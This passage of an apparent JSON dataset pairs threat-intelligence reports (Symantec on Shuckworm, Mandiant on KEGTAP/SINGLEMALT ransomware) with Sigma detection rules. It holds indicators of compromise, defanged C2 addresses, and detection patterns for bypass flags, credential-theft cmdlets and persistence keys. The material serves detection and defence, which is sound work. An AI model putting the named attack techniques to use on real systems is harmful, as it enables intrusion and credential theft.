individuals working at the various organizations was a priority for the attackers, among other things.\n\nThis activity demonstrates that Shuckworm’s relentless focus on Ukraine continues. It seems clear that Russian nation-state-backed attack groups continue to prioritize high-value Ukrainian targets in attempts to find data that may potentially help their military operations.\n\n## Protection/Mitigation\n\nFor the latest protection updates, please visit the Symantec Protection Bulletin.\n\n## Indicators of Compromise\n\n**Malicious documents**\n\n- f7a6ae1b3a866b7e031f60d5d22d218f99edfe754ef262f449ed3271d6306192\n- 31e60a361509b60e7157756d6899058213140c3b116a7e91207248e5f41a096b\n- c62dd5b6036619ced5de3a340c1bb2c9d9564bc5c48e25496466a36ecd00db30\n- c6f6838afcb177ea9dda624100ce95549cee93d9a7c8a6d131ae2359cabd82c8\n- 3393fbdb0057399a7e04e61236c987176c1498c12cd869dc0676ada859617137\n- 3458cec74391baf583fbc5db3b62f1ce106e6cffeebd0978ec3d51cebf3d6601\n- acc2b78ce1c0fc806663e3258135cdb4fed60682454ab0646897e3f240690bb8\n\n**USB propagation scripts**\n\n- 28358a4a6acdcdfc6d41ea642220ef98c63b9c3ef2268449bb02d2e2e71e7c01\n- 2aee8bb2a953124803bc42e5c42935c92f87030b65448624f51183bf00dd1581\n- dbd03444964e9fcbd582eb4881a3ff65d9513ccc08bd32ff9a61c89ad9cc9d87\n- a615c41bcf81dd14b8240a7cafb3c7815b48bb63842f7356731ade5c81054df5\n- 91d42a959c5e4523714cc589b426fa83aaeb9228364218046f36ff10c4834b86\n\n**Example of LNK files created**\n\n- 7d6264ce74e298c6d58803f9ebdb4a40b4ce909d02fd62f54a1f8d682d73519a\n\n**LNK file names**\n\n- account.rtf.lnk\n- account_card.rtf.lnk\n- application.rtf.lnk\n- bank_accоunt.rtf.lnk\n- blank_cap.rtf.lnk\n- business trip.rtf.lnk\n- compromising_evidence.rtf.lnk\n- conduct.rtf.lnk\n- cuprovod.rtf.lnk\n- do_not_delete.rtf.lnk\n- dsk.rtf.lnk\n- encouragement.rtf.lnk\n- form_new.rtf.lnk\n- instructions.rtf.lnk\n- journey.mdb\n- letter to.rtf.lnk\n- login_password.docx.lnk\n- login_password.rtf.lnk\n- mobilization.rtf.lnk\n- my_documents.rtf.lnk\n- my_photos.rtf.lnk\n- not_delete.rtf.lnk\n- on_account.rtf.lnk\n- order.rtf.lnk\n- petition.rtf.lnk\n- porn_video.rtf.lnk\n- pornography.rtf.lnk\n- pornophoto.rtf.lnk\n- proceedings.rtf.lnk\n- project_sheet.rtf.lnk\n- report.docx.lnk\n- report.rtf.lnk\n- report_note.rtf.lnk\n- request.rtf.lnk\n- resolution.rtf.lnk\n- secret.rtf.lnk\n- secretly.rtf.lnk\n- service.docx.lnk\n- service.rtf.lnk\n- sources.rtf.lnk\n- support.rtf.lnk\n- weapons_list.rtf.lnk\n\n**Recent C&C infrastructure (2023)**\n\n- 45.76.141[.]166\n- 159.223.112[.]245\n- 140.82.56[.]186\n- 159.203.164[.]194\n- 45.32.94[.]58\n- 45.95.232[.]33\n- 139.59.109[.]100\n- 164.92.245[.]246\n- 45.32.101[.]6\n- 140.82.18[.]48\n- 216.128.140[.]45\n- 146.190.127[.]238\n- 207.148.74[.]68\n- 195.133.88[.]19\n- 146.190.60[.]230\n- 84.32.190[.]137\n- 206.189.154[.]168\n- 188.166.4[.]128\n- 104.248.54[.]250\n- 165.227.76[.]84\n- 66.42.104[.]158\n- 161.35.95[.]47\n- 149.28.125[.]56\n- 143.198.50[.]118\n- 66.42.126[.]121\n- 64.227.72[.]210\n- 81.19.140[.]147\n- 165.232.77[.]197\n- 146.190.117[.]209\n- 134.122.51[.]47\n- 143.198.152[.]232\n- 140.82.47[.]181\n- 159.223.102[.]109\n- 170.64.188[.]146\n- 155.138.194[.]244\n- 45.32.88[.]90\n- 89.185.84[.]32\n- 64.226.84[.]229\n- 206.189.14[.]94\n- 24.199.84[.]132\n- 45.32.41[.]115\n- 84.32.188[.]69\n- 206.189.128[.]172\n- 170.64.168[.]228\n- 161.35.238[.]148\n- 170.64.138[.]138\n- 178.128.86[.]43\n- 206.81.28[.]5\n- 178.128.231[.]180\n- 45.77.115[.]67\n- 136.244.65[.]253\n- 143.244.190[.]199\n- 159.65.176[.]121\n- 192.248.154[.]154\n- 209.97.175[.]128\n- 147.182.240[.]58\n- 146.190.212[.]239\n- 143.198.135[.]132\n- 45.76.202[.]102\n- 142.93.108[.]1\n- 46.101.127[.]147\n- 134.209.0[.]136\n- 138.68.110[.]19\n- 167.99.215[.]50\n- 161.35.232[.]118\n- 88.216.210[.]3\n- 165.227.121[.]87\n- 165.227.48[.]59\n- 108.61.211[.]250\n- 89.185.84[.]48\n- 167.172.69[.]123\n- 89.185.84[.]50\n- 206.189.0[.]134\n- 68.183.200[.]0\n- 178.128.16[.]170\n- 95.179.144[.]161\n- 164.92.222[.]8\n- 45.95.233[.]80\n- 78.141.239[.]24\n- 149.28.181[.]232\n- 24.199.107[.]218\n- 45.32.184[.]140\n- 167.172.20[.]159\n- 84.32.190[.]31\n- 164.92.185[.]60\n- 84.32.131[.]38\n- 137.184.178[.]46\n- 206.189.149[.]103\n- 157.245.176[.]123\n- 45.95.232[.]92\n- 45.95.232[.]29\n- 170.64.150[.]90\n- 89.185.84[.]45\n- 140.82.16[.]120\n- 84.32.185[.]136\n- 134.122.43[.]175\n- 195.133.88[.]55\n- 84.32.191[.]147\n- 78.141.238[.]136\n- 45.82.13[.]84\n- 159.65.248[.]0\n- 84.32.34[.]69\n- 170.64.146[.]194\n- 45.82.13[.]22\n- 45.82.13[.]23\n- 134.209.33[.]42\n- 199.247.8[.]115\n- 84.32.128[.]239\n- 173.199.70[.]238\n- 138.68.174[.]177\n- 178.128.213[.]177\n- 143.110.180[.]68\n- 167.172.144[.]127\n- 165.232.165[.]42\n- 45.95.232[.]51\n- 149.28.98[.]149\n- 104.156.230[.]193\n- 104.248.86[.]158\n- 134.122.51[.]47\n- 134.209.182[.]221\n- 139.59.60[.]191\n- 140.82.11[.]60\n- 140.82.47[.]181\n- 140.82.50[.]37\n- 143.198.135[.]132\n- 143.198.53[.]203\n- 147.182.250[.]33\n- 149.28.130[.]189\n- 149.28.181[.]232\n- 149.28.98[.]149\n- 155.138.194[.]244\n- 157.245.69[.]118\n- 158.247.204[.]242\n- 159.223.102[.]109\n- 159.223.23[.]23\n- 164.92.72[.]212\n- 165.22.72[.]74\n- 165.227.76[.]84\n- 165.232.120[.]169\n- 167.172.58[.]96\n- 167.71.67[.]58\n- 170.64.136[.]186\n- 170.64.140[.]214\n- 170.64.156[.]98\n- 178.128.228[.]252\n- 188.166.176[.]39\n- 188.166.7[.]140\n- 193.149.176[.]26\n- 195.133.88[.]55\n- 202.182.116[.]135\n- 202.182.98[.]100\n- 206.189.80[.]216\n- 207.148.72[.]173\n- 31.129.22[.]46\n- 31.129.22[.]48\n- 31.129.22[.]50\n- 45.32.101[.]6\n- 45.32.117[.]62\n- 45.32.158[.]96\n- 45.32.62[.]100\n- 45.32.88[.]90\n- 45.82.13[.]84\n- 45.95.232[.]33\n- 45.95.232[.]74\n- 45.95.233[.]80\n- 5.199.161[.]29\n- 64.226.84[.]229\n- 64.227.64[.]163\n- 66.42.104[.]158\n- 68.183.200[.]0\n- 78.141.239[.]24\n- 78.153.139[.]7\n- 81.19.140[.]147\n- 84.32.131[.]47\n- 84.32.188[.]13\n- 95.179.144[.]161\n- 95.179.245[.]185\n- 216.128.178[.]248",
    "sigma_rule": {
      "title": "Script Interpreter Execution From Suspicious Folder",
      "id": "1228c958-e64e-4e71-92ad-7d429f4138ba",
      "status": "test",
      "description": "Detects a suspicious script execution in temporary folders or folders accessible by environment variables",
      "references": [
        "https://www.virustotal.com/gui/file/91ba814a86ddedc7a9d546e26f912c541205b47a853d227756ab1334ade92c3f",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-russia-ukraine-military",
        "https://learn.microsoft.com/en-us/windows/win32/shell/csidl"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-02-08",
      "modified": "2023-06-16",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_proc_image": {
          "Image|endswith": [
            "\\cscript.exe",
            "\\mshta.exe",
            "\\wscript.exe"
          ]
        },
        "selection_proc_flags": {
          "CommandLine|contains": [
            " -ep bypass ",
            " -ExecutionPolicy bypass ",
            " -w hidden ",
            "/e:javascript ",
            "/e:Jscript ",
            "/e:vbscript "
          ]
        },
        "selection_proc_original": {
          "OriginalFileName": [
            "cscript.exe",
            "mshta.exe",
            "wscript.exe"
          ]
        },
        "selection_folders_1": {
          "CommandLine|contains": [
            ":\\Perflogs\\",
            ":\\Users\\Public\\",
            "\\AppData\\Local\\Temp",
            "\\AppData\\Roaming\\Temp",
            "\\Temporary Internet",
            "\\Windows\\Temp"
          ]
        },
        "selection_folders_2": [
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          }
        ],
        "condition": "1 of selection_proc_* and 1 of selection_folders_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_script_exec_from_env_folder.yml",
    "id": "567"
  },
  {
    "url": "https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious SYSVOL Domain Group Policy Access",
      "id": "05f3c945-dcc8-4393-9f3d-af65077a8f86",
      "status": "test",
      "description": "Detects Access to Domain Group Policies stored in SYSVOL",
      "references": [
        "https://adsecurity.org/?p=2288",
        "https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100"
      ],
      "author": "Markus Neis, Jonhnathan Ribeiro, oscd.community",
      "date": "2018-04-09",
      "modified": "2022-01-07",
      "tags": [
        "attack.credential-access",
        "attack.t1552.006"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\SYSVOL\\",
            "\\policies\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_sysvol_access.yml",
    "id": "574"
  },
  {
    "url": "https://tria.ge/240731-jh4crsycnb/behavioral2",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Process Masquerading As SvcHost.EXE",
      "id": "be58d2e2-06c8-4f58-b666-b99f6dc3b6cd",
      "related": [
        {
          "id": "01d2e2a1-5f09-44f7-9fc1-24faa7479b6d",
          "type": "similar"
        },
        {
          "id": "e4a6b256-3e47-40fc-89d2-7a477edd6915",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects a suspicious process that is masquerading as the legitimate \"svchost.exe\" by naming its binary \"svchost.exe\" and executing from an uncommon location.\nAdversaries often disguise their malicious binaries by naming them after legitimate system processes like \"svchost.exe\" to evade detection.\n",
      "references": [
        "https://tria.ge/240731-jh4crsycnb/behavioral2",
        "https://redcanary.com/blog/threat-detection/process-masquerading/"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-08-07",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\svchost.exe"
        },
        "filter_main_img_location": {
          "Image": [
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Windows\\SysWOW64\\svchost.exe"
          ]
        },
        "filter_main_ofn": {
          "OriginalFileName": "svchost.exe"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_svchost_masqueraded_execution.yml",
    "id": "580"
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser\n\n**October 28, 2020**\n\n---\n\nThroughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat.\n\nThe malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these malware families communicate with the same command and control infrastructure (C2) and are close to functional parity, there are minimal code overlaps across them. Other security researchers have tracked these malware families under the names BazarLoader and BazarBackdoor or Team9.\n\nThe operators conducting these campaigns have actively targeted hospitals, retirement communities, and medical centers, even in the midst of a global health crisis, demonstrating a clear disregard for human life.\n\n## Email Campaign TTPs\n\nCampaigns distributing KEGTAP, SINGLEMALT, and WINEKEY have been sent to individuals at organizations across a broad range of industries and geographies using a series of shifting delivery tactics, techniques, and procedures (TTPs). Despite the frequent changes seen across these campaigns, the following has remained consistent across recent activity:\n\n- Emails contain an in-line link to an actor-controlled Google Docs document, typically a PDF file.\n- This document contains an in-line link to a URL hosting a malware payload.\n- Emails masquerade as generic corporate communications, including follow-ups about documents and phone calls or emails crafted to appear related to complaints, terminations, bonuses, contracts, working schedules, surveys, or queries about business hours.\n- Some email communications have included the recipient’s name or employer name in the subject line and/or email body.\n\nDespite this uniformity, the associated TTPs have otherwise changed regularly—both between campaigns and across multiple spam runs seen in the same day. Notable ways that these campaigns have varied over time include:\n\n- Early campaigns were delivered via Sendgrid and included in-line links to Sendgrid URLs that would redirect users to attacker-created Google documents. In contrast, recent campaigns have been delivered via attacker-controlled or compromised email infrastructure and have commonly contained in-line links to attacker-created Google documents, although they have also used links associated with the Constant Contact service.\n- The documents loaded by these in-line links are crafted to appear somewhat relevant to the theme of the email campaign and contain additional links along with instructions directing users to click on them. When clicked, these links download malware binaries with file names masquerading as document files. Across earlier campaigns, these malware binaries were hosted on compromised infrastructure; however, the attackers have shifted to hosting their malware on legitimate web services, including Google Drive, Basecamp, Slack, Trello, Yougile, and JetBrains.\n- In recent campaigns, the malware payloads have been hosted on numerous URLs associated with one or more of these legitimate services. In cases where the payloads have been taken down, the actors have sometimes updated their Google documents to contain new, working links.\n- Some campaigns have also incorporated customization, including emails with internal references to the recipients’ organizations and organizations’ logos embedded into the Google Docs documents.\n\n```image\nAlt: Figure 1: Email containing internal references to target an organization’s name\nDescription: The image depicts a screenshot of an email titled 'Contract cancellation reminder.' The email appears to be crafted to resemble a legitimate corporate communication, with a greeting and a message informing the recipient that a contract with their company is temporarily suspended. It includes a link to a Google Docs document, which is likely intended to download malware when clicked. The email uses an official-sounding sender name, 'Bethanne Wesley,' and features a professional layout, making it seem credible to the recipient.\nTranscription: |\n  Contract cancellation reminder\n  \n  From: Bethanne Wesley <andrew.constantine@littlernews.mobi>\n  Date: Today at 11:42 AM\n  \n  Good day to you, [REDACTED]!\n  Unfortunately, we are here to tell you that our contract with [REDACTED] company is temporarily suspended because of the riots on the factory house. Payments compensation info and contract you can find here:\n  https://docs.google.com/document/d/e/2PACX-1vTX6R2anNzKGbShQGLLz_U7DvhhakDw3kOO3b6-0Gr1w6BmDwmFsXM994WAnmptW4D17wANH7l_2/pub\n  \n  We are sorry for such troubles.\n  \n  Regards,\n  Bethanne Wesley\n```\n\n```image\nAlt: Figure 2: Google Docs PDF document containing a target organization’s logo\nDescription: The image depicts a Google Drive document labeled 'Termination List.PDF' featuring a preview for a document with the title 'Termination List #49376-22/10'. A blue button labeled 'START' is prominently displayed, indicating that users can click to download the document. The message suggests that the document is ready for preview and provides instructions for downloading, emphasizing that the preview is available only on desktop computers. This layout is typical of phishing attempts, which often use such tactics to lure users into downloading malicious payloads.\nTranscription: |\n  Termination List.PDF\n  Updated automatically every 5 minutes\n  \n  Termination List #49376-22/10\n  Termination List #49376-22/10 is ready to preview. If downloading doesn't start automatically, click the buttons below.\n  \n  [START]\n  \n  Preview is available only on desktop computers.\n  \n  Published by Google Drive – Report Abuse\n```\n\nHiding the final payload behind multiple links is a simple yet effective way to bypass some email filtering technologies. Various technologies have the ability to follow links in an email to try to identify malware or malicious domains; however, the number of links followed can vary. Additionally, embedding links within a PDF document further makes automated detection and link-following difficult.\n\n## Post-Compromise TTPs\n\nGiven the possibility that accesses obtained from these campaigns may be provided to various operators to monetize, the latter-stage TTPs, including ransomware family deployed, may vary across intrusions. A notable majority of cases where Mandiant has had visibility into these post-compromise TTPs have been attributable to UNC1878, a financially motivated actor that monetizes network access via the deployment of RYUK ransomware.\n\n### Establish Foothold\n\nOnce the loader and backdoor have been executed on the initial victim host, the actors have used this initial backdoor to download POWERTRICK and/or Cobalt Strike BEACON payloads to establish a foothold. Notably, the respective loader and backdoor as well as POWERTRICK have typically been installed on a small number of hosts in observed incidents, suggesting these payloads may be reserved for establishing a foothold and performing initial network and host reconnaissance. However, BEACON is frequently found on a larger number of hosts and used throughout various stages of the attack lifecycle.\n\n### Maintain Presence\n\nBeyond the preliminary phases of each intrusion, we have seen variations in how these attackers have maintained presence after establishing an initial foothold or moving laterally within a network. In addition to the use of common post-exploitation frameworks such as Cobalt Strike, Metasploit, and EMPIRE, we have observed the use of other backdoors, including ANCHOR, that we also believe to be under control of the actors behind TrickBot.\n\n- The loaders associated with this activity can maintain persistence through reboot by using at least four different techniques, including creating a scheduled task, adding itself to the startup folder as a shortcut, creating a scheduled Microsoft BITS job using `/setnotifycmdline`, and adding itself to the Userinit value under the following registry key:\n  - `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`\n- Actors have downloaded POWERTRICK, Metasploit Meterpreter, and Cobalt Strike BEACON payloads following the initial compromise. BEACON payloads have commonly been executed after moving laterally to new hosts within the victim network. The attackers have employed Cobalt Strike payloads crafted to maintain persistence through reboot via a scheduled task on critical systems in victim environments. Notably, BEACON is the backdoor observed most frequently across these incidents.\n- We have observed actors executing encoded PowerShell commands that ultimately executed instances of the PowerShell EMPIRE backdoor.\n- The actors were observed using BEACON to execute PowerLurk's Register-MaliciousWmiEvent cmdlet to register WMI events used to kill processes related to security tools and utilities, including Task Manager, WireShark, TCPView, ProcDump, Process Explorer, Process Monitor, NetStat, PSLoggedOn, LogonSessions, Process Hacker, Autoruns, AutorunsSC, RegEdit, and RegShot.\n- In at least one case, attackers have maintained access to a victim environment using stolen credentials to access corporate VPN infrastructure configured to require only single-factor authentication.\n\n### Escalate Privileges\n\nThe most commonly observed methods for escalating privileges in these incidents have involved the use of valid credentials. The actors used a variety of techniques for accessing credentials stored in memory or on disk to access privileged accounts.\n\n- The actors used valid credentials obtained using MimiKatz variants to escalate privileges. We’ve observed Mimikatz being executed both from the file system of victim hosts and via PowerShell cmdlets executed via Cobalt Strike BEACON.\n- Actors have gained access to credentials via exported copies of the `ntds.dit` Active Directory database and SYSTEM and SECURITY registry hives from a Domain Controller.\n- In multiple instances, the actors have launched attacks against Kerberos, including the use of RUBEUS, the MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet.\n\n### Reconnaissance\n\nThe approaches taken to perform host and network reconnaissance across these incidents varied; however, a significant portion of observed reconnaissance activity has revolved around Activity Directory enumeration using publicly available utilities such as BLOODHOUND, SHARPHOUND, or ADFind, as well as the execution of PowerShell cmdlets using Cobalt Strike BEACON.\n\n- BEACON has been installed on a large number of systems across these intrusions and has been used to execute various reconnaissance commands including both built-in host commands and PowerShell cmdlets. Observed PowerShell cmdlets include:\n  - `Get-GPPPassword`\n  - `Invoke-AllChecks`\n  - `Invoke-BloodHound`\n  - `Invoke-EternalBlue`\n  - `Invoke-FileFinder`\n  - `Invoke-HostRecon`\n  - `Invoke-Inveigh`\n  - `Invoke-Kerberoast`\n  - `Invoke-LoginPrompt`\n  - `Invoke-mimikittenz`\n  - `Invoke-ShareFinder`\n  - `Invoke-UserHunter`\n- Mandiant has observed actors using POWERTRICK to execute built-in system commands on the initial victim host, including `ipconfig`, `findstr`, and `cmd.exe`.\n- The actors leveraged publicly available utilities Adfind, BLOODHOUND, SHARPHOUND, and KERBRUTE on victim networks to collect Active Directory information and credentials.\n- WMIC commands have been used to perform host reconnaissance, including listing installed software, listing running processes, and identifying operating system and system architecture.\n- The actors have used a batch script to ping all servers identified during Active Directory enumeration and output the results to `res.txt`.\n- The actors used the `Nltest` command to list domain controllers.\n\n### Lateral Movement\n\nLateral movement was most commonly accomplished using valid credentials in combination with Cobalt Strike BEACON, RDP, and SMB, or using the same backdoors used to establish a foothold in victim networks.\n\n- The actors have regularly leveraged Cobalt Strike BEACON and Metasploit Meterpreter to move laterally within victim environments.\n- The actors commonly moved laterally within victim environments using compromised accounts—both those belonging to regular users and accounts with administrative privileges. In addition to the use of common post-exploitation frameworks, lateral movement has also been achieved using WMIC commands and the Windows RDP and SMB protocols.\n- The actors used the Windows `net use` command to connect to Windows admin shares to move laterally.\n\n### Complete Mission\n\nMandiant is directly aware of incidents involving KEGTAP that included the post-compromise deployment of RYUK ransomware. We have also observed instances where ANCHOR infections, another backdoor associated with the same actors, preceded CONTI or MAZE deployment.\n\n- In at least one case, an executable was observed that was designed to exfiltrate files via SFTP to an attacker-controlled server.\n- The actors have used Cobalt Strike BEACON to exfiltrate data created through network reconnaissance activities as well as user files.\n- The actors were observed deleting their tools from victim hosts in an attempt to remove indicators of compromise.\n- The actors have used their access to the victim network to deploy ransomware payloads. There is evidence to suggest that RYUK ransomware was likely deployed via PsExec, but other scripts or artifacts related to the distribution process were not available for forensic analysis.\n\n## Hunting Strategies\n\nIf an organization identifies a host with an active infection believed to be an instance of KEGTAP or a parallel malware family, the following containment actions are recommended. Note that due to the velocity of this intrusion activity, these actions should be taken in parallel.\n\n- Isolate and perform a forensic review of any impacted systems.\n- Review incoming emails to the user that owns the impacted device for emails matching the distribution campaigns, and take action to remove the messages from all mailboxes.\n- Identify the URLs used by the phishing campaign and block them using proxy or network security devices.\n- Reset credentials for any user accounts associated with execution of the malware.\n- Perform an enterprise-wide review for lateral movement authentication from the impacted systems.\n- Check authentication logs from any single-factor remote access solutions that may exist (VPN, VDI, etc.) and move towards multi-factor authentication (MFA) as soon as possible.\n\nAn enterprise-wide effort should be made to identify host-based artifacts related to the execution of first-stage malware and all post-intrusion activity associated with this activity. Some baseline approaches to this have been captured as follows.\n\nActivity associated with the KEGTAP loader can often be identified via a review of system startup folders and Userinit values under the `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` registry key.\n\n```\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adobe.lnk\n```\n\n*Figure 3: Example LNK file associated with KEGTAP persistence within a system’s startup folders*\n\nSINGLEMALT employs BITS to maintain persistence through reboot and can often be identified via a review of anomalous BITS jobs. SINGLEMALT uses a well-documented BITS persistence mechanism that intentionally creates a job to download a non-existent URL, which will trigger a failure event. The job is set to retry on a regular interval, thus ensuring the malware continues to run. To review the BITS job on a host, run the command `bitsadmin /list`.\n\n- Display name may be “Adobe Update”, “System autoupdate” or another generic value.\n- Notify state may be set to Fail (Status 2).\n- FileList URL value may be set to the local host or a URL that does not exist.\n- The Notification Command Line value may contain the path to the SINGLEMALT sample and/or a command to move it to a new location then start it.\n- The Retry Delay value will be set.\n\nWINEKEY maintains persistence through reboot via the use of registry RUN keys. Searching for anomalous RUN keys enterprise-wide can help to identify systems impacted by this malware.\n\n```\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr\n\nValue: Path to the backdoor\n```\n\n*Figure 4: Example registry RUN key used by WINEKEY to maintain persistence*\n\nThe ANCHOR backdoor has been seen across a subset of intrusions associated with this activity and can often be identified via the scheduled tasks it uses to maintain persistence through reboot. The scheduled tasks created by ANCHOR are often unnamed, although that is not always the case.\n\n- The identification of named scheduled tasks associated with ANCHOR persistence may be constructed according to the following pattern: `<Random directory within %APPDATA%> autoupdate#<random number>`.\n- All unnamed scheduled tasks should be reviewed, particularly those with a creation date consistent with the time of the suspected compromise.\n\nAlthough it is a low fidelity indicator, ANCHOR activity may also sometimes be identified by searching for binaries within the `C:\\Windows\\SysWOW64` directory that have a file name matching the following pattern: `<8 random lowercase chars>.exe`. Stacking or sorting on file creation timestamps in the `C:\\Windows\\SysWOW64` directory may also help identify malicious files, as the directory should be mostly static.\n\nPost-exploitation activity associated with the deployment of ransomware following these campaigns is typically conducted using the Cobalt Strike attack framework. The BEACON payload associated with Cobalt Strike can often be identified via a review of existing registered services and service creation events (Event ID 7045), both markers of the mechanism it most commonly employs to maintain persistence.\n\nThe following are additional strategies that may aid in identifying associated activity:\n\n- Organizations can review web proxy logs in order to identify HXXP requests for file storage, project management, collaboration, or communication services with a referrer from a Google Docs document.\n- During the associated post-compromise activity, attackers have commonly staged their tools and data in the PerfLogs directory and C$ share.\n- While collecting data used to enable later-stage operations, the attackers commonly leave instances of `ntds.dit` and exports of the SYSTEM and SECURITY registry hives on impacted systems.\n\n## Hardening Strategies\n\nThe actions taken by the actors to escalate privileges and move laterally in an environment use well-documented techniques that search the network and Active Directory for common misconfigurations that expose credentials and systems for abuse. Organizations can take steps to limit the impact and effectiveness of these techniques. For more in-depth recommendations see our ransomware protection white paper.\n\n- Harden service accounts against brute force and password guessing attacks. Most organizations have at least a few service accounts with passwords set to never expire. These passwords are likely old and insecure. Make a best effort to reset as many of these accounts as possible to long and complex passwords. In cases where it is possible, migrate to MSAs and gMSAS for automated rotation.\n- Prevent the usage of privileged accounts for lateral movement. Use GPOs to restrict the ability for privileged accounts such as Domain Administrators and privileged service accounts from initiating RDP connections and network logins. Actors often pick just a few accounts to use for RDP; by limiting the number of potential accounts, you provide detection opportunities and opportunities to slow the actor.\n- Block internet access for servers where possible. Often times there is no business need for servers, especially AD infrastructure systems, to access the Internet. The actors often choose high-uptime servers for the deployment of post-exploitation tools such as BEACON.\n- Block uncategorized and newly registered domains using web proxies or DNS filters. Often the final payload delivered via phishing is hosted on a compromised third-party website that does not have a business categorization.\n- Ensure that critical patches are installed on Windows systems as well as network infrastructure. We have observed attackers exploiting well-known vulnerabilities such as Zerologon (CVE-2020-1472) to escalate privileges in an environment prior to deploying ransomware. In other cases, possibly unrelated to UNC1878, we have observed threat actors gain access to an environment through vulnerable VPN infrastructure before deploying ransomware.\n\nFor more intelligence on ransomware and other threats, please register for Mandiant Advantage Free, a no-cost version of our threat intelligence platform. Check out this episode of *State of the Hack* for additional information on this threat.\n\n## Campaign Indicators\n\n### Sample Email Subjects / Patterns\n\n- `<(first|last)-name>: Important Information`\n- `<Company Name>`\n- `<Company Name> complaint`\n- `<(first|last)-name>`\n- Agreement cancellation message\n- Agreement suspension notice\n- Contract cancellation reminder\n- FW: `<Name>` Annual Bonus Report is Ready\n- RE: `<(first|last)-name>`: Your Payslip for October\n- RE: `<Company Name>` Employee Survey\n- RE: `<Name>` termination list\n- RE: `<Company Name>` office\n- RE: Urgent `<Company Name>` Employee Internal Survey\n- RE: Working schedule adjustment\n- RE: Your Payslip for September\n\n### Example Malware Family MD5s\n\n- **KEGTAP**\n  - `df00d1192451268c31c1f8568d1ff472`\n- **BEERBOT**\n  - `6c6a2bfa5846fab374b2b97e65095ec9`\n- **SINGLEMALT**\n  - `37aa5690094cb6d638d0f13851be4246`\n- **STILLBOT**\n  - `3176c4a2755ae00f4fffe079608c7b25`\n- **WINEKEY**\n  - `9301564bdd572b0773f105287d8837c4`\n- **CORKBOT**\n  - `0796f1c1ea0a142fc1eb7109a44c86cb`\n\n### Code Signing Certificate CNs\n\n- ARTBUD RADOM SP Z O O\n- BESPOKE SOFTWARE SOLUTIONS LIMITED\n- Best Fud, OOO\n- BlueMarble GmbH\n- CHOO FSP, LLC\n- Company Megacom SP Z O O\n- ESTELLA, OOO\n- EXON RENTAL SP Z O O\n- Geksan LLC\n- GLOBAL PARK HORIZON SP Z O O\n- Infinite Programming Limited\n- James LTH d.o.o.\n- Logika OOO\n- MADAS d.o.o.\n- MUSTER PLUS SP Z O O\n- NEEDCODE SP Z O O\n- Nordkod LLC\n- NOSOV SP Z O O\n- OOO MEP\n- PLAN CORP PTY LTD\n- REGION TOURISM LLC\n- RESURS-RM OOO\n- Retalit LLC\n- Rumikon LLC\n- SNAB-RESURS, OOO\n- TARAT d.o.o.\n- TES LOGISTIKA d.o.o.\n- VAS CO PTY LTD\n- VB CORPORATE PTY. LTD.\n- VITA-DE d.o.o.\n\n## UNC1878 Indicators\n\nA significant proportion of the post-compromise activity associated with these campaigns has involved the distribution of RYUK ransomware by a threat group tracked by Mandiant as UNC1878. As such, we are releasing indicators associated with this group.\n\n### BEACON C2s\n\n| First Seen | Domain                         |\n| ---------- | ------------------------------ |\n| 12/11/19   | updatemanagir[.]us             |\n| 12/20/19   | cmdupdatewin[.]com             |\n| 12/26/19   | scrservallinst[.]info          |\n| 1/10/20    | winsystemupdate[.]com          |\n| 1/11/20    | jomamba[.]best                 |\n| 1/13/20    | updatewinlsass[.]com           |\n| 1/16/20    | winsysteminfo[.]com            |\n| 1/20/20    | livecheckpointsrs[.]com        |\n| 1/21/20    | ciscocheckapi[.]com            |\n| 1/28/20    | timesshifts[.]com              |\n| 